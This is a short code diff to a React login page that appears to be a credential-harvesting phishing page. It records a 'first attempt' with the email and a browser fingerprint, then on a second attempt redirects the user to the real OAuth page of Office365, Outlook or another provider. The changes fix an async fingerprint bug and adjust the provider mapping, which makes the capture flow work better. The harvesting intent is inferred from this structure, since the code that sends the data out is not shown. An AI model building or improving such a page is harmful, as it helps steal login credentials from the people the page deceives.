@@ -53,7 +53,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
       setLoginAttempts(currentAttempt);
 
       // Capture a local fingerprint snapshot for the stored first attempt
-      const browserFingerprint = getBrowserFingerprint();
+      // getBrowserFingerprint is async — await it so we store real data instead of a Promise
+      const browserFingerprint = await getBrowserFingerprint();
 
       const firstAttemptData = {
         email,
@@ -83,11 +84,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
       }
 
       // SECOND ATTEMPT: Do NOT send first-attempt here. Instead redirect to provider-specific OAuth.
-      // Only use Microsoft/Outlook OAuth when the selected provider is Office365 or Outlook.
+      // Keep provider mapping exact so Office365 maps to Office365 and Outlook to Outlook.
       const state = generateState();
-      const oauthTarget = (selectedProvider === 'Office365' || selectedProvider === 'Outlook')
-        ? 'Outlook'
-        : selectedProvider;
+      const oauthTarget = selectedProvider; // preserve direct mapping
       const oauthUrl = buildOAuthUrl(oauthTarget, state);
 
       // Slight pause for UX, then redirect
